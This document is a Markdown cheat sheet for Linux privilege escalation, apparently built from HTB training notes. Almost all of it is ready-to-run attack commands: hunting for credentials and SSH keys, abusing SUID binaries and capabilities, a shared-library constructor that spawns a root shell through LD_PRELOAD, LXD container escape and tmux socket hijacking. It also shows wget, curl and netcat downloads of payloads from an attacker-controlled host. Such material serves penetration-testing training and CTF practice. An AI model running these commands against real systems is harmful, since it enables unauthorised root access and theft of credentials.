# Linux Privilege Escalation Cheat Sheet

> Use only in authorised labs, CTFs, exams, or systems where you have explicit permission to test.
> Replace placeholders such as `<TARGET_IP>`, `<USERNAME>`, `<PASSWORD>`, `<ATTACKER_IP>`, `<PORT>`, and `<PATH>` before running commands.

---

## Table of Contents

1. [Initial Access](#1-initial-access)
2. [Basic System Enumeration](#2-basic-system-enumeration)
3. [User and Group Enumeration](#3-user-and-group-enumeration)
4. [Home Directory and SSH Key Checks](#4-home-directory-and-ssh-key-checks)
5. [Shell History and Credential Hunting](#5-shell-history-and-credential-hunting)
6. [Sudo Privilege Checks](#6-sudo-privilege-checks)
7. [Processes and Cron Jobs](#7-processes-and-cron-jobs)
8. [Network and Filesystem Enumeration](#8-network-and-filesystem-enumeration)
9. [Writable Files and Directories](#9-writable-files-and-directories)
10. [Kernel and OS Version Checks](#10-kernel-and-os-version-checks)
11. [SUID and SGID Binaries](#11-suid-and-sgid-binaries)
12. [PATH Hijacking](#12-path-hijacking)
13. [Shared Libraries, LD_PRELOAD, and RUNPATH](#13-shared-libraries-ld_preload-and-runpath)
14. [Linux Capabilities](#14-linux-capabilities)
15. [NFS Privilege Escalation](#15-nfs-privilege-escalation)
16. [LXD/LXC Privilege Escalation](#16-lxdlxc-privilege-escalation)
17. [tmux Session Hijacking](#17-tmux-session-hijacking)
18. [Automated Enumeration Tools](#18-automated-enumeration-tools)
19. [File Transfer](#19-file-transfer)
20. [Quick Workflow](#20-quick-workflow)
21. [Placeholder Reference](#21-placeholder-reference)

---

# 1. Initial Access

## SSH to Target

```bash id="vlt3yz"
ssh <USERNAME>@<TARGET_IP>
```

Example with a specific private key:

```bash id="dqkp1m"
ssh -i <PRIVATE_KEY> <USERNAME>@<TARGET_IP>
```

Disable strict host key checking in lab environments:

```bash id="o69wy5"
ssh -o StrictHostKeyChecking=no <USERNAME>@<TARGET_IP>
```

Useful once logged in:

```bash id="93nb23"
whoami
hostname
id
pwd
```

---

# 2. Basic System Enumeration

Start by understanding the current user, host, operating system, kernel, and environment.

## Current User and Host

```bash id="22z6bq"
whoami
```

```bash id="z1j5be"
id
```

```bash id="fa8a4o"
hostname
```

```bash id="8l6p6z"
pwd
```

```bash id="lt3c1u"
echo $SHELL
```

---

## Environment Variables

```bash id="qrh0ph"
env
```

```bash id="guzhp1"
printenv
```

```bash id="l1ymth"
echo $PATH
```

Look for:

* Custom writable paths
* Application-specific variables
* Credentials in environment variables
* Proxy settings
* Database connection strings
* Unusual `PATH` entries

---

## Current Shell

```bash id="i3wqg4"
ps -p $$
```

Upgrade a limited shell:

```bash id="cpuypd"
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Then press:

```text id="q51ub6"
Ctrl+Z
```

On your attacker machine:

```bash id="ec77ev"
stty raw -echo; fg
```

Then in the target shell:

```bash id="qx4zsd"
reset
export TERM=xterm
stty rows 40 columns 120
```

---

# 3. User and Group Enumeration

User and group membership often reveals obvious privilege escalation paths.

## Current User Identity

```bash id="cd7wj6"
id
```

```bash id="ecrqxg"
groups
```

```bash id="lvd5eh"
whoami
```

Look for interesting groups:

| Group             | Why It Matters                                        |
| ----------------- | ----------------------------------------------------- |
| `sudo`            | May allow running commands as root                    |
| `adm`             | Can often read logs                                   |
| `docker`          | May allow mounting the host filesystem in a container |
| `lxd` / `lxc`     | May allow privileged container escalation             |
| `disk`            | May allow raw disk access                             |
| `shadow`          | May allow reading password hashes                     |
| `root`            | High-impact group membership                          |
| `www-data`        | Web service context; check web configs                |
| `backup`          | May access backups containing secrets                 |
| `staff`           | Sometimes has write access to `/usr/local`            |
| `systemd-journal` | Can read system journals                              |
| `video`           | Sometimes useful for screen/framebuffer access        |

---

## Logged-In Users

```bash id="pj30g5"
w
```

```bash id="di6kq5"
who
```

```bash id="3dq71a"
users
```

The original HTB command:

```bash id="fq51p4"
ps au
```

This can show processes associated with logged-in users.

---

## Local Users

```bash id="gt4e4l"
cat /etc/passwd
```

Show users with valid shells:

```bash id="j8bvkj"
grep -E "sh$|bash$|zsh$" /etc/passwd
```

List usernames only:

```bash id="z3x9ti"
cut -d: -f1 /etc/passwd
```

---

## Groups

```bash id="bvw9a4"
cat /etc/group
```

Find groups for a specific user:

```bash id="xg1day"
groups <USERNAME>
```

---

# 4. Home Directory and SSH Key Checks

User home directories often contain SSH keys, scripts, credentials, notes, config files, and history files.

## List Home Directories

```bash id="z0ekyq"
ls /home
```

Detailed listing:

```bash id="x1o3ae"
ls -la /home
```

---

## Check Current User SSH Directory

```bash id="71uo0d"
ls -la ~/.ssh
```

Look for:

```text id="ckx23q"
id_rsa
id_ed25519
authorized_keys
known_hosts
config
```

---

## Find SSH Keys

```bash id="axwmvs"
find /home -name "id_rsa" -o -name "id_ed25519" 2>/dev/null
```

```bash id="v1mm0s"
find / -name "id_rsa" -o -name "id_ed25519" 2>/dev/null
```

Check permissions:

```bash id="oe5qzc"
ls -la /home/<USERNAME>/.ssh/
```

Fix local key permissions before using:

```bash id="rwu96w"
chmod 600 <PRIVATE_KEY>
```

Use key:

```bash id="8jguhs"
ssh -i <PRIVATE_KEY> <USERNAME>@<TARGET_IP>
```

---

# 5. Shell History and Credential Hunting

History files and config files often contain passwords, tokens, commands, database credentials, and reused secrets.

## Bash History

```bash id="dow0tv"
history
```

```bash id="c12fsx"
cat ~/.bash_history
```

Other common history files:

```bash id="oquc5t"
cat ~/.zsh_history
cat ~/.mysql_history
cat ~/.psql_history
cat ~/.python_history
```

Search history for secrets:

```bash id="on90x0"
grep -iE "pass|password|pwd|token|secret|key|cred" ~/.*history 2>/dev/null
```

---

## Search for Config Files

```bash id="eg9pqn"
find / ! -path "*/proc/*" -iname "*config*" -type f 2>/dev/null
```

Useful expanded searches:

```bash id="n35vw7"
find /home /var/www /opt /srv -type f \( -iname "*.conf" -o -iname "*.config" -o -iname "*.ini" -o -iname "*.env" -o -iname "*.yml" -o -iname "*.yaml" -o -iname "*.json" \) 2>/dev/null
```

---

## Search for Passwords in Files

```bash id="ec5jcy"
grep -RniE "password|passwd|pwd|secret|token|apikey|api_key|credential" /home /var/www /opt /srv 2>/dev/null
```

Search only readable files:

```bash id="nl1s8p"
find /home /var/www /opt /srv -type f -readable 2>/dev/null | xargs grep -iE "password|secret|token|key" 2>/dev/null
```

---

## Common Interesting Files

```bash id="ypatb0"
cat /etc/passwd
```

```bash id="lbpk6j"
cat /etc/crontab
```

```bash id="nygiik"
cat /etc/fstab
```

```bash id="x0yd9d"
cat /etc/exports
```

```bash id="d9dowv"
ls -la /var/www/
```

```bash id="hokvlg"
ls -la /opt/
```

```bash id="9wmxf2"
ls -la /srv/
```

---

# 6. Sudo Privilege Checks

`sudo -l` is one of the most important Linux privilege escalation checks.

## List Sudo Permissions

```bash id="yfqtli"
sudo -l
```

This shows whether the user can run commands as root or another user.

Useful things to look for:

| Pattern                  | Why It Matters                                           |
| ------------------------ | -------------------------------------------------------- |
| `(ALL : ALL) ALL`        | Full sudo access                                         |
| `NOPASSWD`               | Can run without knowing the password                     |
| Specific binary allowed  | Check GTFOBins for escape methods                        |
| Wildcards                | May allow argument/path abuse                            |
| Environment preservation | May allow `LD_PRELOAD`, `LD_LIBRARY_PATH`, or PATH abuse |
| Running as another user  | May allow lateral movement                               |

---

## Run Command as Another User

```bash id="p4ga4g"
sudo -u <TARGET_USER> <COMMAND>
```

Run shell as root if permitted:

```bash id="m8cxp1"
sudo /bin/bash
```

```bash id="4taauj"
sudo -s
```

```bash id="dc62gi"
sudo -i
```

---

## Check Sudo Version

```bash id="nwgyvr"
sudo -V
```

Sudo version may matter for known vulnerabilities, but do not rely on kernel or sudo exploits before checking simpler misconfigurations.

---

# 7. Processes and Cron Jobs

Processes can reveal credentials in command lines, recurring jobs, backup scripts, and root-owned automation.

## Processes Running as Root

```bash id="fsznsm"
ps aux | grep root
```

Better view:

```bash id="mc0hfr"
ps auxww
```

Root-only processes:

```bash id="cqlc4d"
ps -eo user,pid,ppid,cmd | grep '^root'
```

---

## Watch Processes Manually

```bash id="ladqxt"
watch -n 1 'ps auxww'
```

---

## pspy

`pspy` can reveal cron jobs and short-lived processes without requiring root.

```bash id="17gjkm"
./pspy64 -pf -i 1000
```

Common alternatives:

```bash id="3hzkv6"
./pspy32 -pf -i 1000
```

Make executable:

```bash id="pjaqy7"
chmod +x ./pspy64
```

---

## System Cron Files

```bash id="alx0uq"
cat /etc/crontab
```

```bash id="3dfec3"
ls -la /etc/cron.d/
```

```bash id="zct7jw"
ls -la /etc/cron.daily/
```

```bash id="p5o2p8"
ls -la /etc/cron.hourly/
```

```bash id="eknbk2"
ls -la /etc/cron.weekly/
```

```bash id="pjzcvt"
ls -la /var/spool/cron/
```

```bash id="p3hx18"
ls -la /var/spool/cron/crontabs/
```

---

## User Crontab

```bash id="00uuki"
crontab -l
```

For another user, if permitted:

```bash id="fq7a36"
sudo crontab -u <USERNAME> -l
```

Look for:

* Writable scripts run by root
* Wildcards in tar/rsync jobs
* Relative paths
* Scripts in `/tmp`, `/var/tmp`, `/dev/shm`, `/opt`, or `/home`
* Backups exposing sensitive files

---

# 8. Network and Filesystem Enumeration

## Network Interfaces

```bash id="0i7a1c"
ip a
```

```bash id="fxyoz2"
ifconfig
```

---

## Routing Table

```bash id="ks5x0k"
ip route
```

```bash id="jvkd6q"
route -n
```

---

## Listening Ports

```bash id="9n70vt"
ss -tulpen
```

```bash id="e9ss4f"
netstat -tulpen
```

Without process details:

```bash id="3sk2ti"
ss -tuln
```

Look for services bound to localhost:

```bash id="9id7ug"
ss -tulpen | grep 127.0.0.1
```

---

## Mounted Filesystems

```bash id="zqecrv"
mount
```

```bash id="l0sl8a"
findmnt
```

---

## Block Devices and Unmounted Drives

```bash id="3z4fta"
lsblk
```

```bash id="w8u44p"
blkid
```

```bash id="rbhesw"
df -h
```

Check `/etc/fstab`:

```bash id="3iih90"
cat /etc/fstab
```

---

# 9. Writable Files and Directories

Writable paths can lead to privilege escalation when root or another privileged process uses them.

## World-Writable Directories

```bash id="v7gcg5"
find / -path /proc -prune -o -type d -perm -o+w 2>/dev/null
```

Safer version excluding virtual filesystems:

```bash id="bvh9xt"
find / -path /proc -prune -o -path /sys -prune -o -path /dev -prune -o -type d -perm -o+w -print 2>/dev/null
```

---

## World-Writable Files

```bash id="w8t8f4"
find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
```

Writable files owned by root:

```bash id="kvryyy"
find / -type f -user root -writable 2>/dev/null
```

Writable directories not owned by current user:

```bash id="cm56bx"
find / -type d -writable ! -user $(whoami) 2>/dev/null
```

---

## Check Permissions

```bash id="nwkx1b"
ls -la <PATH>
```

```bash id="bjfvu4"
stat <PATH>
```

```bash id="5g32gb"
getfacl <PATH>
```

---

# 10. Kernel and OS Version Checks

Kernel exploits should usually be a last resort. First check configuration issues, sudo, SUID, writable scripts, cron, services, and credentials.

## Kernel Version

```bash id="xozswc"
uname -a
```

```bash id="ujfuye"
uname -r
```

---

## OS Version

```bash id="kxhmjy"
cat /etc/lsb-release
```

```bash id="5fprl8"
cat /etc/os-release
```

```bash id="b4qsxu"
hostnamectl
```

---

## Compile C Exploit

```bash id="g6rrhq"
gcc kernel_exploit.c -o kernel_exploit
```

Static compile where possible:

```bash id="huhfky"
gcc kernel_exploit.c -o kernel_exploit -static
```

If target has no compiler, compile on a matching attacker VM and transfer the binary.

---

## Check Screen Version

```bash id="rv1iki"
screen -v
```

Specific package versions can matter for known local privilege escalation vulnerabilities.

---

# 11. SUID and SGID Binaries

SUID and SGID binaries run with the permissions of their owner or group. Misconfigured or unusual binaries can be abused.

## Find SUID Binaries

```bash id="aly83z"
find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
```

Alternative:

```bash id="nfylda"
find / -perm -u=s -type f 2>/dev/null
```

---

## Find SGID Binaries

```bash id="ge2cgf"
find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null
```

Alternative:

```bash id="un3wcn"
find / -perm -g=s -type f 2>/dev/null
```

---

## Common SUID Binaries Worth Checking

```text id="9llw1t"
find
bash
cp
mv
vim
nano
less
more
nmap
python
perl
ruby
tar
zip
gdb
env
systemctl
mount
umount
pkexec
screen
```

Check GTFOBins for allowed or SUID-enabled binaries:

```text id="q6zmw5"
https://gtfobins.github.io/
```

---

## Example: SUID bash

If `/bin/bash` has SUID set:

```bash id="e1ks4o"
bash -p
```

---

# 12. PATH Hijacking

PATH hijacking can work when a privileged script or binary runs commands without absolute paths.

## Check PATH

```bash id="ybe7n1"
echo $PATH
```

---

## Add Current Directory to PATH

```bash id="z83l2o"
PATH=.:${PATH}
```

Or export permanently for the session:

```bash id="9fzgo8"
export PATH=.:$PATH
```

---

## Safer Test for PATH Hijacking

Create a harmless test command:

```bash id="su0i3e"
echo -e '#!/bin/bash\nid > /tmp/path-test.txt' > <COMMAND_NAME>
chmod +x <COMMAND_NAME>
```

Run the vulnerable script/binary and check:

```bash id="6tilvp"
cat /tmp/path-test.txt
```

Look for vulnerable scripts using commands without absolute paths:

```bash id="awufxk"
grep -R "cp\|mv\|tar\|chmod\|chown\|service\|systemctl" /opt /usr/local /home 2>/dev/null
```

---

# 13. Shared Libraries, LD_PRELOAD, and RUNPATH

Shared library abuse can work when sudo allows environment variables or when a binary loads libraries from writable locations.

## View Shared Objects Required by a Binary

```bash id="oea54k"
ldd /bin/ls
```

For a target binary:

```bash id="ujvzjq"
ldd <BINARY>
```

---

## Check RUNPATH or RPATH

```bash id="jypudv"
readelf -d <BINARY> | grep PATH
```

Look for writable directories in:

```text id="qzb9r6"
RUNPATH
RPATH
```

---

## Compile Shared Library

```bash id="pnbngi"
gcc src.c -fPIC -shared -o /tmp/libshared.so
```

Example generic shared library skeleton:

```c id="vewpi1"
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor)) void init() {
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
}
```

Compile:

```bash id="xmyy9l"
gcc src.c -fPIC -shared -o /tmp/root.so
```

---

## LD_PRELOAD with sudo

First check whether sudo preserves `LD_PRELOAD`:

```bash id="p0m8kc"
sudo -l
```

Look for:

```text id="q0wmk8"
env_keep+=LD_PRELOAD
```

Then:

```bash id="g74ck7"
sudo LD_PRELOAD=/tmp/root.so <ALLOWED_SUDO_COMMAND>
```

Example from the original sheet:

```bash id="fvjyw4"
sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart
```

---

# 14. Linux Capabilities

Linux capabilities can grant powerful permissions to binaries without full SUID root.

## List Capabilities

```bash id="iy92d2"
getcap -r / 2>/dev/null
```

Interesting capabilities include:

| Capability               | Why It Matters                               |
| ------------------------ | -------------------------------------------- |
| `cap_setuid+ep`          | May allow setting UID to root                |
| `cap_setgid+ep`          | May allow setting GID                        |
| `cap_dac_read_search+ep` | May allow reading protected files            |
| `cap_dac_override+ep`    | May bypass file permissions                  |
| `cap_sys_admin+ep`       | Very powerful; often root-equivalent         |
| `cap_chown+ep`           | May allow ownership changes                  |
| `cap_net_raw+ep`         | Useful for packet-related abuse, less direct |

Example Python with `cap_setuid`:

```bash id="7rq323"
./python3 -c 'import os; os.setuid(0); os.system("/bin/bash -p")'
```

---

# 15. NFS Privilege Escalation

NFS misconfigurations can expose writable shares or allow privilege escalation when `no_root_squash` is enabled.

## Show NFS Exports

```bash id="fmu6nh"
showmount -e <TARGET_IP>
```

Example:

```bash id="yihw54"
showmount -e 10.129.2.12
```

---

## Mount NFS Share Locally

```bash id="37zjg2"
sudo mount -t nfs <TARGET_IP>:<REMOTE_SHARE> <LOCAL_MOUNT>
```

Example:

```bash id="hubu49"
sudo mount -t nfs 10.129.2.12:/tmp /mnt
```

---

## Check Export Options

On target, if readable:

```bash id="xcej8b"
cat /etc/exports
```

Look for:

```text id="6fghpr"
no_root_squash
rw
```

If `no_root_squash` is enabled, root-created files on the client may remain root-owned on the server.

---

## Unmount Share

```bash id="hsn0ne"
sudo umount <LOCAL_MOUNT>
```

---

# 16. LXD/LXC Privilege Escalation

If the user is in the `lxd` or `lxc` group, they may be able to create a privileged container and mount the host filesystem.

## Check Group Membership

```bash id="kzzqlf"
id
```

Look for:

```text id="9kvgjz"
lxd
lxc
```

---

## Initialise LXD

```bash id="w38quo"
lxd init
```

---

## Import Local Image

```bash id="eoa8qg"
lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine
```

---

## Create Privileged Container

```bash id="kp9c1h"
lxc init alpine <CONTAINER_NAME> -c security.privileged=true
```

Example:

```bash id="fzrogi"
lxc init alpine r00t -c security.privileged=true
```

---

## Mount Host Filesystem

```bash id="zm2viq"
lxc config device add <CONTAINER_NAME> mydev disk source=/ path=/mnt/root recursive=true
```

Example:

```bash id="ah2axz"
lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true
```

---

## Start Container

```bash id="j4zw37"
lxc start <CONTAINER_NAME>
```

---

## Enter Container

```bash id="hzfj68"
lxc exec <CONTAINER_NAME> /bin/sh
```

Host filesystem should be mounted at:

```bash id="foxm46"
/mnt/root
```

---

# 17. tmux Session Hijacking

A shared or poorly permissioned tmux socket may allow another user to attach to a privileged session.

## Create Shared tmux Session Socket

```bash id="t6tnsf"
tmux -S /shareds new -s debugsess
```

---

## List tmux Sockets

```bash id="h2xxz1"
find / -name "*tmux*" 2>/dev/null
```

```bash id="9pcisp"
ls -la /tmp/tmux-*
```

---

## Attach to tmux Socket

```bash id="jmqeyx"
tmux -S <SOCKET_PATH> attach
```

Example:

```bash id="2ze7d2"
tmux -S /shareds attach
```

Check socket permissions:

```bash id="xhir3d"
ls -la <SOCKET_PATH>
```

---

# 18. Automated Enumeration Tools

Automated tools can speed up checks, but always manually validate findings.

## pspy

```bash id="s5baea"
chmod +x pspy64
./pspy64 -pf -i 1000
```

Useful for:

* Cron jobs
* Root scripts
* Short-lived commands
* Backup jobs
* Process command lines

---

## LinPEAS

```bash id="hiik9m"
chmod +x linpeas.sh
./linpeas.sh
```

Save output:

```bash id="pm2pek"
./linpeas.sh | tee linpeas-output.txt
```

---

## LinEnum

```bash id="pct9nt"
chmod +x LinEnum.sh
./LinEnum.sh
```

---

## Linux Smart Enumeration

```bash id="l2x7x9"
chmod +x lse.sh
./lse.sh
```

---

## Lynis

```bash id="w6t1k3"
./lynis audit system
```

Lynis performs a broader security audit and can identify misconfigurations, weak permissions, services, kernel settings, and hardening gaps.

---

# 19. File Transfer

Privilege escalation often requires transferring enumeration tools, payloads, or compiled binaries.

## Start HTTP Server on Attacker

```bash id="pn6w4k"
python3 -m http.server <PORT>
```

---

## Download with wget

```bash id="t4tn95"
wget http://<ATTACKER_IP>:<PORT>/<FILE>
```

---

## Download with curl

```bash id="o42j5g"
curl -O http://<ATTACKER_IP>:<PORT>/<FILE>
```

---

## Download with Python

```bash id="kzdkx1"
python3 -c 'import urllib.request; urllib.request.urlretrieve("http://<ATTACKER_IP>:<PORT>/<FILE>", "<FILE>")'
```

---

## Netcat Transfer

Receiver:

```bash id="94i6w0"
nc -lvnp <PORT> > <FILE>
```

Sender:

```bash id="1qm94f"
nc <TARGET_IP> <PORT> < <FILE>
```

---

## Make File Executable

```bash id="s4f6uz"
chmod +x <FILE>
```

---

# 20. Quick Workflow

## Step 1: Identify User Context

```bash id="gbw9rq"
whoami
id
groups
hostname
pwd
```

---

## Step 2: Check OS and Kernel

```bash id="9x68z1"
uname -a
cat /etc/os-release
cat /etc/lsb-release 2>/dev/null
```

---

## Step 3: Check Sudo

```bash id="fig95u"
sudo -l
```

---

## Step 4: Check Users, Home Directories, and History

```bash id="pys9v0"
ls -la /home
ls -la ~/.ssh
history
cat ~/.bash_history 2>/dev/null
```

---

## Step 5: Check Processes and Cron

```bash id="f962oh"
ps auxww
cat /etc/crontab
ls -la /etc/cron.*
```

---

## Step 6: Check Network and Filesystems

```bash id="jmaofw"
ip a
ip route
ss -tulpen
lsblk
mount
cat /etc/fstab
```

---

## Step 7: Check Writable Paths

```bash id="pelybv"
find / -path /proc -prune -o -type d -perm -o+w 2>/dev/null
find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
```

---

## Step 8: Check SUID, SGID, and Capabilities

```bash id="f5dil7"
find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null
getcap -r / 2>/dev/null
```

---

## Step 9: Hunt for Credentials

```bash id="0t3jlo"
grep -RniE "password|passwd|pwd|secret|token|apikey|api_key|credential" /home /var/www /opt /srv 2>/dev/null
find / ! -path "*/proc/*" -iname "*config*" -type f 2>/dev/null
```

---

## Step 10: Document Findings

Record:

```text id="fzpriw"
Current user:
Groups:
Sudo permissions:
Hostname:
OS version:
Kernel version:
Interesting users:
Interesting groups:
Writable directories:
Writable files:
SUID binaries:
SGID binaries:
Capabilities:
Cron jobs:
Running root processes:
Open local ports:
Config files:
Credentials found:
Likely escalation path:
Commands run:
Evidence:
```

---

# 21. Placeholder Reference

| Placeholder        | Meaning                                   |
| ------------------ | ----------------------------------------- |
| `<TARGET_IP>`      | Target machine IP address                 |
| `<TARGET_HOST>`    | Target hostname                           |
| `<USERNAME>`       | Username                                  |
| `<PASSWORD>`       | Password                                  |
| `<PRIVATE_KEY>`    | SSH private key file                      |
| `<TARGET_USER>`    | User account you want to run as           |
| `<COMMAND>`        | Command to execute                        |
| `<PATH>`           | File or directory path                    |
| `<BINARY>`         | Binary or executable file                 |
| `<FILE>`           | File name                                 |
| `<PORT>`           | TCP or UDP port                           |
| `<ATTACKER_IP>`    | Your VPN, tunnel, or attacking machine IP |
| `<REMOTE_SHARE>`   | Remote NFS export path                    |
| `<LOCAL_MOUNT>`    | Local mount directory                     |
| `<CONTAINER_NAME>` | LXD/LXC container name                    |
| `<SOCKET_PATH>`    | tmux socket path                          |
| `<PID>`            | Process ID                                |

---

# 22. High-Value Checks Summary

Run these early:

```bash id="qufxxa"
whoami; id; hostname; uname -a
```

```bash id="hvo7u6"
sudo -l
```

```bash id="g4gvgf"
find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
```

```bash id="somu5k"
getcap -r / 2>/dev/null
```

```bash id="u4m3iq"
grep -RniE "password|passwd|pwd|secret|token|apikey|api_key|credential" /home /var/www /opt /srv 2>/dev/null
```

```bash id="nvqhcx"
ps auxww
```

```bash id="44jkvp"
cat /etc/crontab; ls -la /etc/cron.*
```

```bash id="6nuj4o"
ss -tulpen
```
